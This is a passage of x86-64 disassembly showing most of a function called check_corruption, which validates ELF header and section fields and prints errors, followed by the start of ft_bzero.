    2bbb:	48 89 c2             	mov    %rax,%rdx
    2bbe:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    2bc2:	48 01 d0             	add    %rdx,%rax
    2bc5:	8b 00                	mov    (%rax),%eax
    2bc7:	83 f8 01             	cmp    $0x1,%eax
    2bca:	75 2c                	jne    2bf8 <check_corruption+0x4a8>
    2bcc:	8b 45 f0             	mov    -0x10(%rbp),%eax
    2bcf:	48 63 d0             	movslq %eax,%rdx
    2bd2:	48 89 d0             	mov    %rdx,%rax
    2bd5:	48 c1 e0 03          	shl    $0x3,%rax
    2bd9:	48 29 d0             	sub    %rdx,%rax
    2bdc:	48 c1 e0 03          	shl    $0x3,%rax
    2be0:	48 89 c2             	mov    %rax,%rdx
    2be3:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    2be7:	48 01 d0             	add    %rdx,%rax
    2bea:	48 8b 40 10          	mov    0x10(%rax),%rax
    2bee:	89 45 f4             	mov    %eax,-0xc(%rbp)
    2bf1:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%rbp)
    2bf8:	8b 45 f0             	mov    -0x10(%rbp),%eax
    2bfb:	48 63 d0             	movslq %eax,%rdx
    2bfe:	48 89 d0             	mov    %rdx,%rax
    2c01:	48 c1 e0 03          	shl    $0x3,%rax
    2c05:	48 29 d0             	sub    %rdx,%rax
    2c08:	48 c1 e0 03          	shl    $0x3,%rax
    2c0c:	48 89 c2             	mov    %rax,%rdx
    2c0f:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    2c13:	48 01 d0             	add    %rdx,%rax
    2c16:	8b 00                	mov    (%rax),%eax
    2c18:	83 f8 01             	cmp    $0x1,%eax
    2c1b:	0f 85 b8 02 00 00    	jne    2ed9 <check_corruption+0x789>
    2c21:	8b 45 f0             	mov    -0x10(%rbp),%eax
    2c24:	48 63 d0             	movslq %eax,%rdx
    2c27:	48 89 d0             	mov    %rdx,%rax
    2c2a:	48 c1 e0 03          	shl    $0x3,%rax
    2c2e:	48 29 d0             	sub    %rdx,%rax
    2c31:	48 c1 e0 03          	shl    $0x3,%rax
    2c35:	48 89 c2             	mov    %rax,%rdx
    2c38:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    2c3c:	48 01 d0             	add    %rdx,%rax
    2c3f:	8b 40 04             	mov    0x4(%rax),%eax
    2c42:	83 e0 05             	and    $0x5,%eax
    2c45:	83 f8 05             	cmp    $0x5,%eax
    2c48:	0f 85 8b 02 00 00    	jne    2ed9 <check_corruption+0x789>
    2c4e:	8b 45 f0             	mov    -0x10(%rbp),%eax
    2c51:	83 c0 01             	add    $0x1,%eax
    2c54:	39 45 d4             	cmp    %eax,-0x2c(%rbp)
    2c57:	0f 8e 7c 02 00 00    	jle    2ed9 <check_corruption+0x789>
    2c5d:	8b 45 f0             	mov    -0x10(%rbp),%eax
    2c60:	48 63 d0             	movslq %eax,%rdx
    2c63:	48 89 d0             	mov    %rdx,%rax
    2c66:	48 c1 e0 03          	shl    $0x3,%rax
    2c6a:	48 29 d0             	sub    %rdx,%rax
    2c6d:	48 c1 e0 03          	shl    $0x3,%rax
    2c71:	48 89 c2             	mov    %rax,%rdx
    2c74:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    2c78:	48 01 d0             	add    %rdx,%rax
    2c7b:	48 8b 40 20          	mov    0x20(%rax),%rax
    2c7f:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
    2c83:	74 26                	je     2cab <check_corruption+0x55b>
    2c85:	8b 45 f0             	mov    -0x10(%rbp),%eax
    2c88:	48 63 d0             	movslq %eax,%rdx
    2c8b:	48 89 d0             	mov    %rdx,%rax
    2c8e:	48 c1 e0 03          	shl    $0x3,%rax
    2c92:	48 29 d0             	sub    %rdx,%rax
    2c95:	48 c1 e0 03          	shl    $0x3,%rax
    2c99:	48 89 c2             	mov    %rax,%rdx
    2c9c:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    2ca0:	48 01 d0             	add    %rdx,%rax
    2ca3:	48 8b 40 20          	mov    0x20(%rax),%rax
    2ca7:	85 c0                	test   %eax,%eax
    2ca9:	7f 48                	jg     2cf3 <check_corruption+0x5a3>
    2cab:	8b 45 f0             	mov    -0x10(%rbp),%eax
    2cae:	48 63 d0             	movslq %eax,%rdx
    2cb1:	48 89 d0             	mov    %rdx,%rax
    2cb4:	48 c1 e0 03          	shl    $0x3,%rax
    2cb8:	48 29 d0             	sub    %rdx,%rax
    2cbb:	48 c1 e0 03          	shl    $0x3,%rax
    2cbf:	48 89 c2             	mov    %rax,%rdx
    2cc2:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    2cc6:	48 01 d0             	add    %rdx,%rax
    2cc9:	48 8b 40 20          	mov    0x20(%rax),%rax
    2ccd:	48 8b 55 88          	mov    -0x78(%rbp),%rdx
    2cd1:	48 89 c6             	mov    %rax,%rsi
    2cd4:	48 8d 05 5d 18 00 00 	lea    0x185d(%rip),%rax        # 4538 <_IO_stdin_used+0x538>
    2cdb:	48 89 c7             	mov    %rax,%rdi
    2cde:	b8 00 00 00 00       	mov    $0x0,%eax
    2ce3:	ff 15 9f 32 00 00    	call   *0x329f(%rip)        # 5f88 <printf@GLIBC_2.2.5>
    2ce9:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    2cee:	e9 5b 05 00 00       	jmp    324e <check_corruption+0xafe>
    2cf3:	8b 45 f0             	mov    -0x10(%rbp),%eax
    2cf6:	48 63 d0             	movslq %eax,%rdx
    2cf9:	48 89 d0             	mov    %rdx,%rax
    2cfc:	48 c1 e0 03          	shl    $0x3,%rax
    2d00:	48 29 d0             	sub    %rdx,%rax
    2d03:	48 c1 e0 03          	shl    $0x3,%rax
    2d07:	48 89 c2             	mov    %rax,%rdx
    2d0a:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    2d0e:	48 01 d0             	add    %rdx,%rax
    2d11:	48 8b 40 28          	mov    0x28(%rax),%rax
    2d15:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
    2d19:	74 26                	je     2d41 <check_corruption+0x5f1>
    2d1b:	8b 45 f0             	mov    -0x10(%rbp),%eax
    2d1e:	48 63 d0             	movslq %eax,%rdx
    2d21:	48 89 d0             	mov    %rdx,%rax
    2d24:	48 c1 e0 03          	shl    $0x3,%rax
    2d28:	48 29 d0             	sub    %rdx,%rax
    2d2b:	48 c1 e0 03          	shl    $0x3,%rax
    2d2f:	48 89 c2             	mov    %rax,%rdx
    2d32:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    2d36:	48 01 d0             	add    %rdx,%rax
    2d39:	48 8b 40 28          	mov    0x28(%rax),%rax
    2d3d:	85 c0                	test   %eax,%eax
    2d3f:	7f 48                	jg     2d89 <check_corruption+0x639>
    2d41:	8b 45 f0             	mov    -0x10(%rbp),%eax
    2d44:	48 63 d0             	movslq %eax,%rdx
    2d47:	48 89 d0             	mov    %rdx,%rax
    2d4a:	48 c1 e0 03          	shl    $0x3,%rax
    2d4e:	48 29 d0             	sub    %rdx,%rax
    2d51:	48 c1 e0 03          	shl    $0x3,%rax
    2d55:	48 89 c2             	mov    %rax,%rdx
    2d58:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    2d5c:	48 01 d0             	add    %rdx,%rax
    2d5f:	48 8b 40 28          	mov    0x28(%rax),%rax
    2d63:	48 8b 55 88          	mov    -0x78(%rbp),%rdx
    2d67:	48 89 c6             	mov    %rax,%rsi
    2d6a:	48 8d 05 f7 17 00 00 	lea    0x17f7(%rip),%rax        # 4568 <_IO_stdin_used+0x568>
    2d71:	48 89 c7             	mov    %rax,%rdi
    2d74:	b8 00 00 00 00       	mov    $0x0,%eax
    2d79:	ff 15 09 32 00 00    	call   *0x3209(%rip)        # 5f88 <printf@GLIBC_2.2.5>
    2d7f:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    2d84:	e9 c5 04 00 00       	jmp    324e <check_corruption+0xafe>
    2d89:	8b 45 f0             	mov    -0x10(%rbp),%eax
    2d8c:	48 63 d0             	movslq %eax,%rdx
    2d8f:	48 89 d0             	mov    %rdx,%rax
    2d92:	48 c1 e0 03          	shl    $0x3,%rax
    2d96:	48 29 d0             	sub    %rdx,%rax
    2d99:	48 c1 e0 03          	shl    $0x3,%rax
    2d9d:	48 89 c2             	mov    %rax,%rdx
    2da0:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    2da4:	48 01 d0             	add    %rdx,%rax
    2da7:	48 8b 40 08          	mov    0x8(%rax),%rax
    2dab:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
    2daf:	75 48                	jne    2df9 <check_corruption+0x6a9>
    2db1:	8b 45 f0             	mov    -0x10(%rbp),%eax
    2db4:	48 63 d0             	movslq %eax,%rdx
    2db7:	48 89 d0             	mov    %rdx,%rax
    2dba:	48 c1 e0 03          	shl    $0x3,%rax
    2dbe:	48 29 d0             	sub    %rdx,%rax
    2dc1:	48 c1 e0 03          	shl    $0x3,%rax
    2dc5:	48 89 c2             	mov    %rax,%rdx
    2dc8:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    2dcc:	48 01 d0             	add    %rdx,%rax
    2dcf:	48 8b 40 08          	mov    0x8(%rax),%rax
    2dd3:	48 8b 55 88          	mov    -0x78(%rbp),%rdx
    2dd7:	48 89 c6             	mov    %rax,%rsi
    2dda:	48 8d 05 b7 17 00 00 	lea    0x17b7(%rip),%rax        # 4598 <_IO_stdin_used+0x598>
    2de1:	48 89 c7             	mov    %rax,%rdi
    2de4:	b8 00 00 00 00       	mov    $0x0,%eax
    2de9:	ff 15 99 31 00 00    	call   *0x3199(%rip)        # 5f88 <printf@GLIBC_2.2.5>
    2def:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    2df4:	e9 55 04 00 00       	jmp    324e <check_corruption+0xafe>
    2df9:	8b 45 f0             	mov    -0x10(%rbp),%eax
    2dfc:	48 63 d0             	movslq %eax,%rdx
    2dff:	48 89 d0             	mov    %rdx,%rax
    2e02:	48 c1 e0 03          	shl    $0x3,%rax
    2e06:	48 29 d0             	sub    %rdx,%rax
    2e09:	48 c1 e0 03          	shl    $0x3,%rax
    2e0d:	48 89 c2             	mov    %rax,%rdx
    2e10:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    2e14:	48 01 d0             	add    %rdx,%rax
    2e17:	48 8b 40 18          	mov    0x18(%rax),%rax
    2e1b:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
    2e1f:	75 48                	jne    2e69 <check_corruption+0x719>
    2e21:	8b 45 f0             	mov    -0x10(%rbp),%eax
    2e24:	48 63 d0             	movslq %eax,%rdx
    2e27:	48 89 d0             	mov    %rdx,%rax
    2e2a:	48 c1 e0 03          	shl    $0x3,%rax
    2e2e:	48 29 d0             	sub    %rdx,%rax
    2e31:	48 c1 e0 03          	shl    $0x3,%rax
    2e35:	48 89 c2             	mov    %rax,%rdx
    2e38:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    2e3c:	48 01 d0             	add    %rdx,%rax
    2e3f:	48 8b 40 18          	mov    0x18(%rax),%rax
    2e43:	48 8b 55 88          	mov    -0x78(%rbp),%rdx
    2e47:	48 89 c6             	mov    %rax,%rsi
    2e4a:	48 8d 05 77 17 00 00 	lea    0x1777(%rip),%rax        # 45c8 <_IO_stdin_used+0x5c8>
    2e51:	48 89 c7             	mov    %rax,%rdi
    2e54:	b8 00 00 00 00       	mov    $0x0,%eax
    2e59:	ff 15 29 31 00 00    	call   *0x3129(%rip)        # 5f88 <printf@GLIBC_2.2.5>
    2e5f:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    2e64:	e9 e5 03 00 00       	jmp    324e <check_corruption+0xafe>
    2e69:	8b 45 f0             	mov    -0x10(%rbp),%eax
    2e6c:	48 63 d0             	movslq %eax,%rdx
    2e6f:	48 89 d0             	mov    %rdx,%rax
    2e72:	48 c1 e0 03          	shl    $0x3,%rax
    2e76:	48 29 d0             	sub    %rdx,%rax
    2e79:	48 c1 e0 03          	shl    $0x3,%rax
    2e7d:	48 89 c2             	mov    %rax,%rdx
    2e80:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    2e84:	48 01 d0             	add    %rdx,%rax
    2e87:	48 8b 40 10          	mov    0x10(%rax),%rax
    2e8b:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
    2e8f:	75 48                	jne    2ed9 <check_corruption+0x789>
    2e91:	8b 45 f0             	mov    -0x10(%rbp),%eax
    2e94:	48 63 d0             	movslq %eax,%rdx
    2e97:	48 89 d0             	mov    %rdx,%rax
    2e9a:	48 c1 e0 03          	shl    $0x3,%rax
    2e9e:	48 29 d0             	sub    %rdx,%rax
    2ea1:	48 c1 e0 03          	shl    $0x3,%rax
    2ea5:	48 89 c2             	mov    %rax,%rdx
    2ea8:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    2eac:	48 01 d0             	add    %rdx,%rax
    2eaf:	48 8b 40 10          	mov    0x10(%rax),%rax
    2eb3:	48 8b 55 88          	mov    -0x78(%rbp),%rdx
    2eb7:	48 89 c6             	mov    %rax,%rsi
    2eba:	48 8d 05 37 17 00 00 	lea    0x1737(%rip),%rax        # 45f8 <_IO_stdin_used+0x5f8>
    2ec1:	48 89 c7             	mov    %rax,%rdi
    2ec4:	b8 00 00 00 00       	mov    $0x0,%eax
    2ec9:	ff 15 b9 30 00 00    	call   *0x30b9(%rip)        # 5f88 <printf@GLIBC_2.2.5>
    2ecf:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    2ed4:	e9 75 03 00 00       	jmp    324e <check_corruption+0xafe>
    2ed9:	8b 45 f0             	mov    -0x10(%rbp),%eax
    2edc:	48 63 d0             	movslq %eax,%rdx
    2edf:	48 89 d0             	mov    %rdx,%rax
    2ee2:	48 c1 e0 03          	shl    $0x3,%rax
    2ee6:	48 29 d0             	sub    %rdx,%rax
    2ee9:	48 c1 e0 03          	shl    $0x3,%rax
    2eed:	48 89 c2             	mov    %rax,%rdx
    2ef0:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    2ef4:	48 01 d0             	add    %rdx,%rax
    2ef7:	8b 00                	mov    (%rax),%eax
    2ef9:	89 45 fc             	mov    %eax,-0x4(%rbp)
    2efc:	83 45 f0 01          	addl   $0x1,-0x10(%rbp)
    2f00:	8b 45 f0             	mov    -0x10(%rbp),%eax
    2f03:	3b 45 d4             	cmp    -0x2c(%rbp),%eax
    2f06:	0f 8c db fb ff ff    	jl     2ae7 <check_corruption+0x397>
    2f0c:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
    2f13:	e9 25 03 00 00       	jmp    323d <check_corruption+0xaed>
    2f18:	c6 45 eb ff          	movb   $0xff,-0x15(%rbp)
    2f1c:	c7 45 e4 ff ff ff ff 	movl   $0xffffffff,-0x1c(%rbp)
    2f23:	eb 2d                	jmp    2f52 <check_corruption+0x802>
    2f25:	83 45 e4 01          	addl   $0x1,-0x1c(%rbp)
    2f29:	8b 45 ec             	mov    -0x14(%rbp),%eax
    2f2c:	48 98                	cltq   
    2f2e:	48 c1 e0 06          	shl    $0x6,%rax
    2f32:	48 89 c2             	mov    %rax,%rdx
    2f35:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    2f39:	48 01 d0             	add    %rdx,%rax
    2f3c:	8b 10                	mov    (%rax),%edx
    2f3e:	8b 45 e4             	mov    -0x1c(%rbp),%eax
    2f41:	01 d0                	add    %edx,%eax
    2f43:	89 c2                	mov    %eax,%edx
    2f45:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
    2f49:	48 01 d0             	add    %rdx,%rax
    2f4c:	0f b6 00             	movzbl (%rax),%eax
    2f4f:	88 45 eb             	mov    %al,-0x15(%rbp)
    2f52:	80 7d eb 00          	cmpb   $0x0,-0x15(%rbp)
    2f56:	75 cd                	jne    2f25 <check_corruption+0x7d5>
    2f58:	83 7d ec 00          	cmpl   $0x0,-0x14(%rbp)
    2f5c:	7e 40                	jle    2f9e <check_corruption+0x84e>
    2f5e:	83 7d e4 00          	cmpl   $0x0,-0x1c(%rbp)
    2f62:	75 3a                	jne    2f9e <check_corruption+0x84e>
    2f64:	8b 45 ec             	mov    -0x14(%rbp),%eax
    2f67:	48 98                	cltq   
    2f69:	48 c1 e0 06          	shl    $0x6,%rax
    2f6d:	48 89 c2             	mov    %rax,%rdx
    2f70:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    2f74:	48 01 d0             	add    %rdx,%rax
    2f77:	8b 00                	mov    (%rax),%eax
    2f79:	48 8b 55 88          	mov    -0x78(%rbp),%rdx
    2f7d:	89 c6                	mov    %eax,%esi
    2f7f:	48 8d 05 a2 16 00 00 	lea    0x16a2(%rip),%rax        # 4628 <_IO_stdin_used+0x628>
    2f86:	48 89 c7             	mov    %rax,%rdi
    2f89:	b8 00 00 00 00       	mov    $0x0,%eax
    2f8e:	ff 15 f4 2f 00 00    	call   *0x2ff4(%rip)        # 5f88 <printf@GLIBC_2.2.5>
    2f94:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    2f99:	e9 b0 02 00 00       	jmp    324e <check_corruption+0xafe>
    2f9e:	8b 45 ec             	mov    -0x14(%rbp),%eax
    2fa1:	48 98                	cltq   
    2fa3:	48 c1 e0 06          	shl    $0x6,%rax
    2fa7:	48 89 c2             	mov    %rax,%rdx
    2faa:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    2fae:	48 01 d0             	add    %rdx,%rax
    2fb1:	8b 00                	mov    (%rax),%eax
    2fb3:	85 c0                	test   %eax,%eax
    2fb5:	78 28                	js     2fdf <check_corruption+0x88f>
    2fb7:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
    2fbb:	48 8b 50 18          	mov    0x18(%rax),%rdx
    2fbf:	8b 45 ec             	mov    -0x14(%rbp),%eax
    2fc2:	48 98                	cltq   
    2fc4:	48 c1 e0 06          	shl    $0x6,%rax
    2fc8:	48 89 c1             	mov    %rax,%rcx
    2fcb:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    2fcf:	48 01 c8             	add    %rcx,%rax
    2fd2:	8b 00                	mov    (%rax),%eax
    2fd4:	89 c0                	mov    %eax,%eax
    2fd6:	48 01 d0             	add    %rdx,%rax
    2fd9:	48 39 45 90          	cmp    %rax,-0x70(%rbp)
    2fdd:	73 3a                	jae    3019 <check_corruption+0x8c9>
    2fdf:	8b 45 ec             	mov    -0x14(%rbp),%eax
    2fe2:	48 98                	cltq   
    2fe4:	48 c1 e0 06          	shl    $0x6,%rax
    2fe8:	48 89 c2             	mov    %rax,%rdx
    2feb:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    2fef:	48 01 d0             	add    %rdx,%rax
    2ff2:	8b 00                	mov    (%rax),%eax
    2ff4:	48 8b 55 88          	mov    -0x78(%rbp),%rdx
    2ff8:	89 c6                	mov    %eax,%esi
    2ffa:	48 8d 05 27 16 00 00 	lea    0x1627(%rip),%rax        # 4628 <_IO_stdin_used+0x628>
    3001:	48 89 c7             	mov    %rax,%rdi
    3004:	b8 00 00 00 00       	mov    $0x0,%eax
    3009:	ff 15 79 2f 00 00    	call   *0x2f79(%rip)        # 5f88 <printf@GLIBC_2.2.5>
    300f:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    3014:	e9 35 02 00 00       	jmp    324e <check_corruption+0xafe>
    3019:	8b 45 ec             	mov    -0x14(%rbp),%eax
    301c:	48 98                	cltq   
    301e:	48 c1 e0 06          	shl    $0x6,%rax
    3022:	48 89 c2             	mov    %rax,%rdx
    3025:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    3029:	48 01 d0             	add    %rdx,%rax
    302c:	8b 00                	mov    (%rax),%eax
    302e:	89 c2                	mov    %eax,%edx
    3030:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
    3034:	48 01 d0             	add    %rdx,%rax
    3037:	48 8d 15 12 16 00 00 	lea    0x1612(%rip),%rdx        # 4650 <_IO_stdin_used+0x650>
    303e:	48 89 d6             	mov    %rdx,%rsi
    3041:	48 89 c7             	mov    %rax,%rdi
    3044:	ff 15 56 2f 00 00    	call   *0x2f56(%rip)        # 5fa0 <strcmp@GLIBC_2.2.5>
    304a:	85 c0                	test   %eax,%eax
    304c:	75 53                	jne    30a1 <check_corruption+0x951>
    304e:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    3052:	48 8b 40 18          	mov    0x18(%rax),%rax
    3056:	8b 4d f4             	mov    -0xc(%rbp),%ecx
    3059:	48 29 c8             	sub    %rcx,%rax
    305c:	48 89 c2             	mov    %rax,%rdx
    305f:	8b 45 ec             	mov    -0x14(%rbp),%eax
    3062:	48 98                	cltq   
    3064:	48 c1 e0 06          	shl    $0x6,%rax
    3068:	48 89 c1             	mov    %rax,%rcx
    306b:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    306f:	48 01 c8             	add    %rcx,%rax
    3072:	48 8b 40 18          	mov    0x18(%rax),%rax
    3076:	48 39 c2             	cmp    %rax,%rdx
    3079:	76 26                	jbe    30a1 <check_corruption+0x951>
    307b:	48 8b 45 88          	mov    -0x78(%rbp),%rax
    307f:	48 89 c6             	mov    %rax,%rsi
    3082:	48 8d 05 cf 15 00 00 	lea    0x15cf(%rip),%rax        # 4658 <_IO_stdin_used+0x658>
    3089:	48 89 c7             	mov    %rax,%rdi
    308c:	b8 00 00 00 00       	mov    $0x0,%eax
    3091:	ff 15 f1 2e 00 00    	call   *0x2ef1(%rip)        # 5f88 <printf@GLIBC_2.2.5>
    3097:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    309c:	e9 ad 01 00 00       	jmp    324e <check_corruption+0xafe>
    30a1:	8b 45 ec             	mov    -0x14(%rbp),%eax
    30a4:	48 98                	cltq   
    30a6:	48 c1 e0 06          	shl    $0x6,%rax
    30aa:	48 89 c2             	mov    %rax,%rdx
    30ad:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    30b1:	48 01 d0             	add    %rdx,%rax
    30b4:	8b 00                	mov    (%rax),%eax
    30b6:	89 c2                	mov    %eax,%edx
    30b8:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
    30bc:	48 01 d0             	add    %rdx,%rax
    30bf:	48 8d 15 e5 15 00 00 	lea    0x15e5(%rip),%rdx        # 46ab <_IO_stdin_used+0x6ab>
    30c6:	48 89 d6             	mov    %rdx,%rsi
    30c9:	48 89 c7             	mov    %rax,%rdi
    30cc:	ff 15 ce 2e 00 00    	call   *0x2ece(%rip)        # 5fa0 <strcmp@GLIBC_2.2.5>
    30d2:	85 c0                	test   %eax,%eax
    30d4:	0f 85 5f 01 00 00    	jne    3239 <check_corruption+0xae9>
    30da:	8b 45 ec             	mov    -0x14(%rbp),%eax
    30dd:	48 98                	cltq   
    30df:	48 c1 e0 06          	shl    $0x6,%rax
    30e3:	48 89 c2             	mov    %rax,%rdx
    30e6:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    30ea:	48 01 d0             	add    %rdx,%rax
    30ed:	48 8b 40 10          	mov    0x10(%rax),%rax
    30f1:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
    30f5:	74 1c                	je     3113 <check_corruption+0x9c3>
    30f7:	8b 45 ec             	mov    -0x14(%rbp),%eax
    30fa:	48 98                	cltq   
    30fc:	48 c1 e0 06          	shl    $0x6,%rax
    3100:	48 89 c2             	mov    %rax,%rdx
    3103:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    3107:	48 01 d0             	add    %rdx,%rax
    310a:	48 8b 40 10          	mov    0x10(%rax),%rax
    310e:	48 85 c0             	test   %rax,%rax
    3111:	75 3d                	jne    3150 <check_corruption+0xa00>
    3113:	8b 45 ec             	mov    -0x14(%rbp),%eax
    3116:	48 98                	cltq   
    3118:	48 c1 e0 06          	shl    $0x6,%rax
    311c:	48 89 c2             	mov    %rax,%rdx
    311f:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    3123:	48 01 d0             	add    %rdx,%rax
    3126:	48 8b 40 10          	mov    0x10(%rax),%rax
    312a:	48 8b 55 88          	mov    -0x78(%rbp),%rdx
    312e:	48 89 c6             	mov    %rax,%rsi
    3131:	48 8d 05 80 15 00 00 	lea    0x1580(%rip),%rax        # 46b8 <_IO_stdin_used+0x6b8>
    3138:	48 89 c7             	mov    %rax,%rdi
    313b:	b8 00 00 00 00       	mov    $0x0,%eax
    3140:	ff 15 42 2e 00 00    	call   *0x2e42(%rip)        # 5f88 <printf@GLIBC_2.2.5>
    3146:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    314b:	e9 fe 00 00 00       	jmp    324e <check_corruption+0xafe>
    3150:	8b 45 ec             	mov    -0x14(%rbp),%eax
    3153:	48 98                	cltq   
    3155:	48 c1 e0 06          	shl    $0x6,%rax
    3159:	48 89 c2             	mov    %rax,%rdx
    315c:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    3160:	48 01 d0             	add    %rdx,%rax
    3163:	48 8b 40 18          	mov    0x18(%rax),%rax
    3167:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
    316b:	74 1c                	je     3189 <check_corruption+0xa39>
    316d:	8b 45 ec             	mov    -0x14(%rbp),%eax
    3170:	48 98                	cltq   
    3172:	48 c1 e0 06          	shl    $0x6,%rax
    3176:	48 89 c2             	mov    %rax,%rdx
    3179:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    317d:	48 01 d0             	add    %rdx,%rax
    3180:	48 8b 40 18          	mov    0x18(%rax),%rax
    3184:	48 85 c0             	test   %rax,%rax
    3187:	75 3d                	jne    31c6 <check_corruption+0xa76>
    3189:	8b 45 ec             	mov    -0x14(%rbp),%eax
    318c:	48 98                	cltq   
    318e:	48 c1 e0 06          	shl    $0x6,%rax
    3192:	48 89 c2             	mov    %rax,%rdx
    3195:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    3199:	48 01 d0             	add    %rdx,%rax
    319c:	48 8b 40 18          	mov    0x18(%rax),%rax
    31a0:	48 8b 55 88          	mov    -0x78(%rbp),%rdx
    31a4:	48 89 c6             	mov    %rax,%rsi
    31a7:	48 8d 05 3a 15 00 00 	lea    0x153a(%rip),%rax        # 46e8 <_IO_stdin_used+0x6e8>
    31ae:	48 89 c7             	mov    %rax,%rdi
    31b1:	b8 00 00 00 00       	mov    $0x0,%eax
    31b6:	ff 15 cc 2d 00 00    	call   *0x2dcc(%rip)        # 5f88 <printf@GLIBC_2.2.5>
    31bc:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    31c1:	e9 88 00 00 00       	jmp    324e <check_corruption+0xafe>
    31c6:	8b 45 ec             	mov    -0x14(%rbp),%eax
    31c9:	48 98                	cltq   
    31cb:	48 c1 e0 06          	shl    $0x6,%rax
    31cf:	48 89 c2             	mov    %rax,%rdx
    31d2:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    31d6:	48 01 d0             	add    %rdx,%rax
    31d9:	48 8b 40 20          	mov    0x20(%rax),%rax
    31dd:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
    31e1:	74 1c                	je     31ff <check_corruption+0xaaf>
    31e3:	8b 45 ec             	mov    -0x14(%rbp),%eax
    31e6:	48 98                	cltq   
    31e8:	48 c1 e0 06          	shl    $0x6,%rax
    31ec:	48 89 c2             	mov    %rax,%rdx
    31ef:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    31f3:	48 01 d0             	add    %rdx,%rax
    31f6:	48 8b 40 20          	mov    0x20(%rax),%rax
    31fa:	48 85 c0             	test   %rax,%rax
    31fd:	75 3a                	jne    3239 <check_corruption+0xae9>
    31ff:	8b 45 ec             	mov    -0x14(%rbp),%eax
    3202:	48 98                	cltq   
    3204:	48 c1 e0 06          	shl    $0x6,%rax
    3208:	48 89 c2             	mov    %rax,%rdx
    320b:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    320f:	48 01 d0             	add    %rdx,%rax
    3212:	48 8b 40 20          	mov    0x20(%rax),%rax
    3216:	48 8b 55 88          	mov    -0x78(%rbp),%rdx
    321a:	48 89 c6             	mov    %rax,%rsi
    321d:	48 8d 05 f4 14 00 00 	lea    0x14f4(%rip),%rax        # 4718 <_IO_stdin_used+0x718>
    3224:	48 89 c7             	mov    %rax,%rdi
    3227:	b8 00 00 00 00       	mov    $0x0,%eax
    322c:	ff 15 56 2d 00 00    	call   *0x2d56(%rip)        # 5f88 <printf@GLIBC_2.2.5>
    3232:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    3237:	eb 15                	jmp    324e <check_corruption+0xafe>
    3239:	83 45 ec 01          	addl   $0x1,-0x14(%rbp)
    323d:	8b 45 ec             	mov    -0x14(%rbp),%eax
    3240:	3b 45 c4             	cmp    -0x3c(%rbp),%eax
    3243:	0f 8c cf fc ff ff    	jl     2f18 <check_corruption+0x7c8>
    3249:	b8 00 00 00 00       	mov    $0x0,%eax
    324e:	c9                   	leave  
    324f:	c3                   	ret    

0000000000003250 <ft_bzero>:
    3250:	f3 0f 1e fa          	endbr64 
    3254:	55                   	push   %rbp
    3255:	48 89 e5             	mov    %rsp,%rbp
    3258:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    325c:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
    3260:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
    3267:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    326b:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    326f:	eb 11                	jmp    3282 <ft_bzero+0x32>
    3271:	8b 55 fc             	mov    -0x4(%rbp),%edx
    3274:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    3278:	48 01 d0             	add    %rdx,%rax
